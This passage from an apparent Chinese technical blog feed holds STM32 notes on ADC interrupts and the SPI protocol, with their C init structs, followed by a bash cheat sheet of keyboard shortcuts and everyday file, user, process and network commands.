title="与其他外设之间"></a>与其他外设之间</h1><h2 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h2><p>ADC有三种中断：</p><ul><li>顺序中断</li><li>注入中断</li><li>看门狗中断</li></ul><p>其中转换结束中断很好理解，跟我们平时接触的中断一样，有相应的中断标志位和中断使能位，我们还可以根据中断类型写相应配套的中断服务程序。</p><h2 id="看门狗中断"><a href="#看门狗中断" class="headerlink" title="看门狗中断"></a>看门狗中断</h2><p>如果设置了看门狗中断的话，当ADC高于或者是低于设定的值时，会发生中断。</p><h2 id="DMA请求"><a href="#DMA请求" class="headerlink" title="DMA请求"></a>DMA请求</h2><p>顺序中断和注入中断可以请求DMA，直接将数据存储到DMA中。</p><p>**DMA请求实际上是</p><hr><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><h2 id="初始化结构体定义"><a href="#初始化结构体定义" class="headerlink" title="初始化结构体定义"></a>初始化结构体定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint32_t</span> ADC_Mode;                      <span class="hljs-comment">// ADC 工作模式选择</span><br>    FunctionalState ADC_ScanConvMode;       <span class="hljs-comment">/* ADC 扫描（多通道）</span><br><span class="hljs-comment">    或者单次（单通道）模式选择 */</span><br>    FunctionalState ADC_ContinuousConvMode; <span class="hljs-comment">// ADC 单次转换或者连续转换选择</span><br>    <span class="hljs-type">uint32_t</span> ADC_ExternalTrigConv;          <span class="hljs-comment">// ADC 转换触发信号。选择转换结果数据对齐模式，可选右对齐ADC_DataAlign_Right或者左对齐ADC_DataAlign_Left。一般我们选择右对齐模式。</span><br>    <span class="hljs-type">uint32_t</span> ADC_DataAlign;                 <span class="hljs-comment">// ADC 数据寄存器对齐格式</span><br>    <span class="hljs-type">uint8_t</span> ADC_NbrOfChannel;               <span class="hljs-comment">// ADC 采集通道数</span><br>&#125; ADC_InitTypeDef;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>片上外设</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SPI通信协议</title>
    <link href="/2023/12/02/SPI%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/"/>
    <url>/2023/12/02/SPI%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>总结stm32中的SPI通信</p><span id="more"></span><h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>SPI通信协议有四根线组成：CS(NSS、SS)、SCK、SDI、SDO  。主要应用在EEPROM、FLASH、实时时钟、AD转换器上，以及数字信号处理器和数字信号解码器之间。</p><p>基本特点：</p><ol><li>全双工</li><li>同步</li><li>串行</li><li>可以多主机</li><li>只有主机可以产生信号</li></ol><p>如果主机连接多个从设备时，则每个从设备上都需要有一个片选引脚接入到主设备机中，当我们的主设备希望和某个从设备通信时，需要将对应从设备的片选引脚电平拉低。同时，SPI协议还规定时钟信号必须由主机提供给从机，从机自身不能产生和控制时钟信号，没有时钟信号同步从机不能正常工作。</p><p>主机和从机的连接方式：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312021657264.png"></p><h2 id="时钟配置"><a href="#时钟配置" class="headerlink" title="时钟配置"></a>时钟配置</h2><p>由于SPI是同步的通信协议，所以其是需要时钟的。</p><p>配置三个参数：</p><ol><li>时钟频率：理论上可以配置任意大小的频率，但是一般受限于系统可以提供的时钟大小，SPI最大时钟频率。</li><li>时钟极性：CPOL，表示SPI总线的极性，当其为0时，SPI总线的空闲状态是低电平，反之为高电平。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312021703816.png"></li><li>时钟相位：CPHA，表示SPI总线的相位，当其为0的时候，表示从第一个跳变沿开始采样，为1的时候表示从第二个跳变沿开始采样。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312021705318.png"></li></ol><p>CPOL和CPHA可以组合出四种工作模式，可以根据不同器件的支持情况和自己的需求进行选择和配置。<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312021709952.png"></p><h2 id="SPI通讯的优缺点"><a href="#SPI通讯的优缺点" class="headerlink" title="SPI通讯的优缺点"></a>SPI通讯的优缺点</h2><p>优点：</p><ol><li>全双工通讯，传输速度快</li><li>没有开始位、停止位。数据传输不会终止</li></ol><p>缺点：</p><ol><li>没有校验位，数据传输的准确性不足</li><li>相较于I2C，其有4根线比较复杂</li></ol><h1 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h1><h2 id="初始化结构体定义"><a href="#初始化结构体定义" class="headerlink" title="初始化结构体定义"></a>初始化结构体定义</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint16_t</span> SPI_Direction;           <span class="hljs-comment">/*设置SPI的单双向模式 */</span><br>    <span class="hljs-type">uint16_t</span> SPI_Mode;                <span class="hljs-comment">/*设置SPI的主/从机端模式 */</span><br>    <span class="hljs-type">uint16_t</span> SPI_DataSize;            <span class="hljs-comment">/*设置SPI的数据帧长度，可选8/16位 */</span><br>    <span class="hljs-type">uint16_t</span> SPI_CPOL;                <span class="hljs-comment">/*设置时钟极性CPOL，可选高/低电平*/</span><br>    <span class="hljs-type">uint16_t</span> SPI_CPHA;                <span class="hljs-comment">/*设置时钟相位，可选奇/偶数边沿采样 */</span><br>    <span class="hljs-type">uint16_t</span> SPI_NSS;                <span class="hljs-comment">/*设置NSS引脚由SPI硬件控制还是软件控制*/</span><br>    <span class="hljs-type">uint16_t</span> SPI_BaudRatePrescaler;  <span class="hljs-comment">/*设置时钟分频因子，fpclk/分频数=fSCK */</span><br>    <span class="hljs-type">uint16_t</span> SPI_FirstBit;            <span class="hljs-comment">/*设置MSB/LSB先行 */</span><br>    <span class="hljs-type">uint16_t</span> SPI_CRCPolynomial;       <span class="hljs-comment">/*设置CRC校验的表达式 */</span><br>&#125; SPI_InitTypeDef;<br><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/SPI006.png"></p>]]></content>
    
    
    <categories>
      
      <category>stm32</category>
      
      <category>SPI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bash中的基本操作备忘录</title>
    <link href="/2023/12/02/bash%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <url>/2023/12/02/bash%E4%B8%AD%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%E5%A4%87%E5%BF%98%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>shell中的基本操作备忘录</p><span id="more"></span><h1 id="常用快捷键（默认使用-Emacs-键位）"><a href="#常用快捷键（默认使用-Emacs-键位）" class="headerlink" title="常用快捷键（默认使用 Emacs 键位）"></a>常用快捷键（默认使用 Emacs 键位）</h1><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs txt">CTRL+A              # 移动到行首，同 &lt;Home&gt;<br>CTRL+B              # 向后移动，同 &lt;Left&gt;<br>CTRL+C              # 结束当前命令<br>CTRL+D              # 删除光标前的字符，同 &lt;Delete&gt; ，或者没有内容时，退出会话<br>CTRL+E              # 移动到行末，同 &lt;End&gt;<br>CTRL+F              # 向前移动，同 &lt;Right&gt;<br>CTRL+G              # 退出当前编辑（比如正在 CTRL+R 搜索历史时）<br>CTRL+H              # 删除光标左边的字符，同 &lt;Backspace&gt;<br>CTRL+K              # 删除光标位置到行末的内容<br>CTRL+L              # 清屏并重新显示<br>CTRL+N              # 移动到命令历史的下一行，同 &lt;Down&gt;<br>CTRL+O              # 类似回车，但是会显示下一行历史<br>CTRL+P              # 移动到命令历史的上一行，同 &lt;Up&gt;<br>CTRL+R              # 历史命令反向搜索，使用 CTRL+G 退出搜索<br>CTRL+S              # 历史命令正向搜索，使用 CTRL+G 退出搜索<br>CTRL+T              # 交换前后两个字符<br>CTRL+U              # 删除字符到行首<br>CTRL+V              # 输入字符字面量，先按 CTRL+V 再按任意键<br>CTRL+W              # 删除光标左边的一个单词<br>CTRL+X              # 列出可能的补全<br>CTRL+Y              # 粘贴前面 CTRL+u/k/w 删除过的内容<br>CTRL+Z              # 暂停前台进程返回 bash，需要时可用 fg 将其切换回前台<br>CTRL+_              # 撤销（undo），有的终端将 CTRL+_ 映射为 CTRL+/ 或 CTRL+7<br><br>ALT+b               # 向后（左边）移动一个单词<br>ALT+d               # 删除光标后（右边）一个单词<br>ALT+f               # 向前（右边）移动一个单词<br>ALT+t               # 交换字符<br>ALT+BACKSPACE       # 删除光标前面一个单词，类似 CTRL+W，但不影响剪贴板<br><br>CTRL+X CTRL+X       # 连续按两次 CTRL+X，光标在当前位置和行首来回跳转 <br>CTRL+X CTRL+E       # 用你指定的编辑器，编辑当前命令<br></code></pre></td></tr></table></figure><h1 id="BASH-基本操作"><a href="#BASH-基本操作" class="headerlink" title="BASH 基本操作"></a>BASH 基本操作</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exit</span>                <span class="hljs-comment"># 退出当前登陆</span><br><span class="hljs-built_in">env</span>                 <span class="hljs-comment"># 显示环境变量</span><br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$SHELL</span>         <span class="hljs-comment"># 显示你在使用什么 SHELL</span><br><br>bash                <span class="hljs-comment"># 使用 bash，用 exit 返回</span><br><span class="hljs-built_in">which</span> bash          <span class="hljs-comment"># 搜索 $PATH，查找哪个程序对应命令 bash</span><br>whereis bash        <span class="hljs-comment"># 搜索可执行，头文件和帮助信息的位置，使用系统内建数据库</span><br>whatis bash         <span class="hljs-comment"># 查看某个命令的解释，一句话告诉你这是干什么的</span><br><br>clear               <span class="hljs-comment"># 清初屏幕内容</span><br>reset               <span class="hljs-comment"># 重置终端（当你不小心 cat 了一个二进制，终端状态乱掉时使用）</span><br></code></pre></td></tr></table></figure><h2 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span>                  <span class="hljs-comment"># 返回自己 $HOME 目录</span><br><span class="hljs-built_in">cd</span> &#123;<span class="hljs-built_in">dirname</span>&#125;        <span class="hljs-comment"># 进入目录</span><br><span class="hljs-built_in">pwd</span>                 <span class="hljs-comment"># 显示当前所在目录</span><br><span class="hljs-built_in">mkdir</span> &#123;<span class="hljs-built_in">dirname</span>&#125;     <span class="hljs-comment"># 创建目录</span><br><span class="hljs-built_in">mkdir</span> -p &#123;<span class="hljs-built_in">dirname</span>&#125;  <span class="hljs-comment"># 递归创建目录</span><br><span class="hljs-built_in">pushd</span> &#123;<span class="hljs-built_in">dirname</span>&#125;     <span class="hljs-comment"># 目录压栈并进入新目录</span><br><span class="hljs-built_in">popd</span>                <span class="hljs-comment"># 弹出并进入栈顶的目录</span><br><span class="hljs-built_in">dirs</span> -v             <span class="hljs-comment"># 列出当前目录栈</span><br><span class="hljs-built_in">cd</span> -                <span class="hljs-comment"># 回到之前的目录</span><br><span class="hljs-built_in">cd</span> -&#123;N&#125;             <span class="hljs-comment"># 切换到目录栈中的第 N个目录，比如 cd -2 将切换到第二个</span><br></code></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span>                  <span class="hljs-comment"># 显示当前目录内容，后面可接目录名：ls &#123;dir&#125; 显示指定目录</span><br><span class="hljs-built_in">ls</span> -l               <span class="hljs-comment"># 列表方式显示目录内容，包括文件日期，大小，权限等信息</span><br><span class="hljs-built_in">ls</span> -1               <span class="hljs-comment"># 列表方式显示目录内容，只显示文件名称，减号后面是数字 1</span><br><span class="hljs-built_in">ls</span> -a               <span class="hljs-comment"># 显示所有文件和目录，包括隐藏文件（.开头的文件/目录名）</span><br><span class="hljs-built_in">ln</span> -s &#123;fn&#125; &#123;<span class="hljs-built_in">link</span>&#125;   <span class="hljs-comment"># 给指定文件创建一个软链接</span><br><span class="hljs-built_in">cp</span> &#123;src&#125; &#123;dest&#125;     <span class="hljs-comment"># 拷贝文件，cp -r dir1 dir2 可以递归拷贝（目录）</span><br><span class="hljs-built_in">rm</span> &#123;fn&#125;             <span class="hljs-comment"># 删除文件，rm -r 递归删除目录，rm -f 强制删除</span><br><span class="hljs-built_in">mv</span> &#123;src&#125; &#123;dest&#125;     <span class="hljs-comment"># 移动文件，如果 dest 是目录，则移动，是文件名则覆盖</span><br><span class="hljs-built_in">touch</span> &#123;fn&#125;          <span class="hljs-comment"># 创建或者更新一下制定文件</span><br><span class="hljs-built_in">cat</span> &#123;fn&#125;            <span class="hljs-comment"># 输出文件原始内容</span><br>any_cmd &gt; &#123;fn&#125;      <span class="hljs-comment"># 执行任意命令并将标准输出重定向到指定文件</span><br>more &#123;fn&#125;           <span class="hljs-comment"># 逐屏显示某文件内容，空格翻页，q 退出</span><br>less &#123;fn&#125;           <span class="hljs-comment"># 更高级点的 more，更多操作，q 退出</span><br><span class="hljs-built_in">head</span> &#123;fn&#125;           <span class="hljs-comment"># 显示文件头部数行，可用 head -3 abc.txt 显示头三行</span><br><span class="hljs-built_in">tail</span> &#123;fn&#125;           <span class="hljs-comment"># 显示文件尾部数行，可用 tail -3 abc.txt 显示尾部三行</span><br><span class="hljs-built_in">tail</span> -f &#123;fn&#125;        <span class="hljs-comment"># 持续显示文件尾部数据，可用于监控日志</span><br>nano &#123;fn&#125;           <span class="hljs-comment"># 使用 nano 编辑器编辑文件</span><br>vim &#123;fn&#125;            <span class="hljs-comment"># 使用 vim 编辑文件</span><br>diff &#123;f1&#125; &#123;f2&#125;      <span class="hljs-comment"># 比较两个文件的内容</span><br><span class="hljs-built_in">wc</span> &#123;fn&#125;             <span class="hljs-comment"># 统计文件有多少行，多少个单词</span><br><span class="hljs-built_in">chmod</span> 644 &#123;fn&#125;      <span class="hljs-comment"># 修改文件权限为 644，可以接 -R 对目录循环改权限</span><br><span class="hljs-built_in">chgrp</span> group &#123;fn&#125;    <span class="hljs-comment"># 修改文件所属的用户组</span><br><span class="hljs-built_in">chown</span> user1 &#123;fn&#125;    <span class="hljs-comment"># 修改文件所有人为 user1, chown user1:group1 fn 可以修改组</span><br>file &#123;fn&#125;           <span class="hljs-comment"># 检测文件的类型和编码</span><br><span class="hljs-built_in">basename</span> &#123;fn&#125;       <span class="hljs-comment"># 查看文件的名字（不包括路径）</span><br><span class="hljs-built_in">dirname</span> &#123;fn&#125;        <span class="hljs-comment"># 查看文件的路径（不包括名字）</span><br>grep &#123;pat&#125; &#123;fn&#125;     <span class="hljs-comment"># 在文件中查找出现过 pat 的内容</span><br>grep -r &#123;pat&#125; .     <span class="hljs-comment"># 在当前目录下递归查找所有出现过 pat 的文件内容</span><br><span class="hljs-built_in">stat</span> &#123;fn&#125;           <span class="hljs-comment"># 显示文件的详细信息</span><br></code></pre></td></tr></table></figure><h1 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>              <span class="hljs-comment"># 显示我的用户名</span><br><span class="hljs-built_in">who</span>                 <span class="hljs-comment"># 显示已登陆用户信息，w / who / users 内容略有不同</span><br>w                   <span class="hljs-comment"># 显示已登陆用户信息，w / who / users 内容略有不同</span><br><span class="hljs-built_in">users</span>               <span class="hljs-comment"># 显示已登陆用户信息，w / who / users 内容略有不同</span><br>passwd              <span class="hljs-comment"># 修改密码，passwd &#123;user&#125; 可以用于 root 修改别人密码</span><br>finger &#123;user&#125;       <span class="hljs-comment"># 显示某用户信息，包括 id, 名字, 登陆状态等</span><br>adduser &#123;user&#125;      <span class="hljs-comment"># 添加用户</span><br>deluser &#123;user&#125;      <span class="hljs-comment"># 删除用户</span><br>w                   <span class="hljs-comment"># 查看谁在线</span><br>su                  <span class="hljs-comment"># 切换到 root 用户</span><br>su -                <span class="hljs-comment"># 切换到 root 用户并登陆（执行登陆脚本）</span><br>su &#123;user&#125;           <span class="hljs-comment"># 切换到某用户</span><br>su -&#123;user&#125;          <span class="hljs-comment"># 切换到某用户并登陆（执行登陆脚本）</span><br><span class="hljs-built_in">id</span> &#123;user&#125;           <span class="hljs-comment"># 查看用户的 uid，gid 以及所属其他用户组</span><br><span class="hljs-built_in">id</span> -u &#123;user&#125;        <span class="hljs-comment"># 打印用户 uid</span><br><span class="hljs-built_in">id</span> -g &#123;user&#125;        <span class="hljs-comment"># 打印用户 gid</span><br>write &#123;user&#125;        <span class="hljs-comment"># 向某用户发送一句消息</span><br>last                <span class="hljs-comment"># 显示最近用户登陆列表</span><br>last &#123;user&#125;         <span class="hljs-comment"># 显示登陆记录</span><br>lastb               <span class="hljs-comment"># 显示失败登陆记录</span><br>lastlog             <span class="hljs-comment"># 显示所有用户的最近登陆记录</span><br>sudo &#123;<span class="hljs-built_in">command</span>&#125;      <span class="hljs-comment"># 以 root 权限执行某命令</span><br><br></code></pre></td></tr></table></figure><h2 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps                        <span class="hljs-comment"># 查看当前会话进程</span><br>ps ax                     <span class="hljs-comment"># 查看所有进程，类似 ps -e</span><br>ps aux                    <span class="hljs-comment"># 查看所有进程详细信息，类似 ps -ef</span><br>ps auxww                  <span class="hljs-comment"># 查看所有进程，并且显示进程的完整启动命令</span><br>ps -u &#123;user&#125;              <span class="hljs-comment"># 查看某用户进程</span><br>ps axjf                   <span class="hljs-comment"># 列出进程树</span><br>ps xjf -u &#123;user&#125;          <span class="hljs-comment"># 列出某用户的进程树</span><br>ps -eo pid,user,<span class="hljs-built_in">command</span>   <span class="hljs-comment"># 按用户指定的格式查看进程</span><br>ps aux | grep httpd       <span class="hljs-comment"># 查看名为 httpd 的所有进程</span><br>ps --ppid &#123;pid&#125;           <span class="hljs-comment"># 查看父进程为 pid 的所有进程</span><br>pstree                    <span class="hljs-comment"># 树形列出所有进程，pstree 默认一般不带，需安装</span><br>pstree &#123;user&#125;             <span class="hljs-comment"># 进程树列出某用户的进程</span><br>pstree -u                 <span class="hljs-comment"># 树形列出所有进程以及所属用户</span><br>pgrep &#123;procname&#125;          <span class="hljs-comment"># 搜索名字匹配的进程的 pid，比如 pgrep apache2</span><br><br><span class="hljs-built_in">kill</span> &#123;pid&#125;                <span class="hljs-comment"># 结束进程</span><br><span class="hljs-built_in">kill</span> -9 &#123;pid&#125;             <span class="hljs-comment"># 强制结束进程，9/SIGKILL 是强制不可捕获结束信号</span><br><span class="hljs-built_in">kill</span> -KILL &#123;pid&#125;          <span class="hljs-comment"># 强制执行进程，kill -9 的另外一种写法</span><br><span class="hljs-built_in">kill</span> -l                   <span class="hljs-comment"># 查看所有信号</span><br><span class="hljs-built_in">kill</span> -l TERM              <span class="hljs-comment"># 查看 TERM 信号的编号</span><br>killall &#123;procname&#125;        <span class="hljs-comment"># 按名称结束所有进程</span><br>pkill &#123;procname&#125;          <span class="hljs-comment"># 按名称结束进程，除名称外还可以有其他参数</span><br><br>top                       <span class="hljs-comment"># 查看最活跃的进程</span><br>top -u &#123;user&#125;             <span class="hljs-comment"># 查看某用户最活跃的进程</span><br><br>any_command &amp;             <span class="hljs-comment"># 在后台运行某命令，也可用 CTRL+Z 将当前进程挂到后台</span><br><span class="hljs-built_in">jobs</span>                      <span class="hljs-comment"># 查看所有后台进程（jobs）</span><br><span class="hljs-built_in">bg</span>                        <span class="hljs-comment"># 查看后台进程，并切换过去</span><br><span class="hljs-built_in">fg</span>                        <span class="hljs-comment"># 切换后台进程到前台</span><br><span class="hljs-built_in">fg</span> &#123;job&#125;                  <span class="hljs-comment"># 切换特定后台进程到前台</span><br><br><span class="hljs-built_in">trap</span> cmd sig1 sig2        <span class="hljs-comment"># 在脚本中设置信号处理命令</span><br><span class="hljs-built_in">trap</span> <span class="hljs-string">&quot;&quot;</span> sig1 sig2         <span class="hljs-comment"># 在脚本中屏蔽某信号</span><br><span class="hljs-built_in">trap</span> - sig1 sig2          <span class="hljs-comment"># 恢复默认信号处理行为</span><br><br><span class="hljs-built_in">nohup</span> &#123;<span class="hljs-built_in">command</span>&#125;           <span class="hljs-comment"># 长期运行某程序，在你退出登陆都保持它运行</span><br><span class="hljs-built_in">nohup</span> &#123;<span class="hljs-built_in">command</span>&#125; &amp;         <span class="hljs-comment"># 在后台长期运行某程序</span><br><span class="hljs-built_in">disown</span> &#123;PID|JID&#125;          <span class="hljs-comment"># 将进程从后台任务列表（jobs）移除</span><br><br><span class="hljs-built_in">wait</span>                      <span class="hljs-comment"># 等待所有后台进程任务结束</span><br><br></code></pre></td></tr></table></figure><h2 id="常用命令：SSH-系统信息-网络"><a href="#常用命令：SSH-系统信息-网络" class="headerlink" title="常用命令：SSH &#x2F; 系统信息 &#x2F; 网络"></a>常用命令：SSH &#x2F; 系统信息 &#x2F; 网络</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh user@host             <span class="hljs-comment"># 以用户 user 登陆到远程主机 host</span><br>ssh -p &#123;port&#125; user@host   <span class="hljs-comment"># 指定端口登陆主机</span><br>ssh-copy-id user@host     <span class="hljs-comment"># 拷贝你的 ssh key 到远程主机，避免重复输入密码</span><br>scp &#123;fn&#125; user@host:path   <span class="hljs-comment"># 拷贝文件到远程主机</span><br>scp user@host:path dest   <span class="hljs-comment"># 从远程主机拷贝文件回来</span><br>scp -P &#123;port&#125; ...         <span class="hljs-comment"># 指定端口远程拷贝文件</span><br><br><span class="hljs-built_in">uname</span> -a                  <span class="hljs-comment"># 查看内核版本等信息</span><br>man &#123;<span class="hljs-built_in">help</span>&#125;                <span class="hljs-comment"># 查看帮助</span><br>man -k &#123;keyword&#125;          <span class="hljs-comment"># 查看哪些帮助文档里包含了该关键字</span><br>info &#123;<span class="hljs-built_in">help</span>&#125;               <span class="hljs-comment"># 查看 info pages，比 man 更强的帮助系统</span><br><span class="hljs-built_in">uptime</span>                    <span class="hljs-comment"># 查看系统启动时间</span><br><span class="hljs-built_in">date</span>                      <span class="hljs-comment"># 显示日期</span><br>cal                       <span class="hljs-comment"># 显示日历</span><br>vmstat                    <span class="hljs-comment"># 显示内存和 CPU 使用情况</span><br>vmstat 10                 <span class="hljs-comment"># 每 10 秒打印一行内存和 CPU情况，CTRL+C 退出</span><br>free                      <span class="hljs-comment"># 显示内存和交换区使用情况</span><br><span class="hljs-built_in">df</span>                        <span class="hljs-comment"># 显示磁盘使用情况</span><br><span class="hljs-built_in">du</span>                        <span class="hljs-comment"># 显示当前目录占用，du . --max-depth=2 可以指定深度</span><br><span class="hljs-built_in">du</span> -h                     <span class="hljs-comment"># 显示当前目录占用，-h 以方便阅读的格式输出 (K/M/G)</span><br><span class="hljs-built_in">uname</span>                     <span class="hljs-comment"># 显示系统版本号</span><br>hostname                  <span class="hljs-comment"># 显示主机名称</span><br>showkey -a                <span class="hljs-comment"># 查看终端发送的按键编码</span><br><br>ping &#123;host&#125;               <span class="hljs-comment"># ping 远程主机并显示结果，CTRL+C 退出</span><br>ping -c N &#123;host&#125;          <span class="hljs-comment"># ping 远程主机 N 次</span><br>traceroute &#123;host&#125;         <span class="hljs-comment"># 侦测路由连通情况</span><br>mtr &#123;host&#125;                <span class="hljs-comment"># 高级版本 traceroute</span><br>host &#123;domain&#125;             <span class="hljs-comment"># DNS 查询，&#123;domain&#125; 前面可加 -a 查看详细信息</span><br>whois &#123;domain&#125;            <span class="hljs-comment"># 取得域名 whois 信息</span><br>dig &#123;domain&#125;              <span class="hljs-comment"># 取得域名 dns 信息</span><br>route -n                  <span class="hljs-comment"># 查看路由表</span><br>netstat -a                <span class="hljs-comment"># 列出所有端口</span><br>netstat -an               <span class="hljs-comment"># 查看所有连接信息，不解析域名</span><br>netstat -anp              <span class="hljs-comment"># 查看所有连接信息，包含进程信息（需要 sudo）</span><br>netstat -l                <span class="hljs-comment"># 查看所有监听的端口</span><br>netstat -t                <span 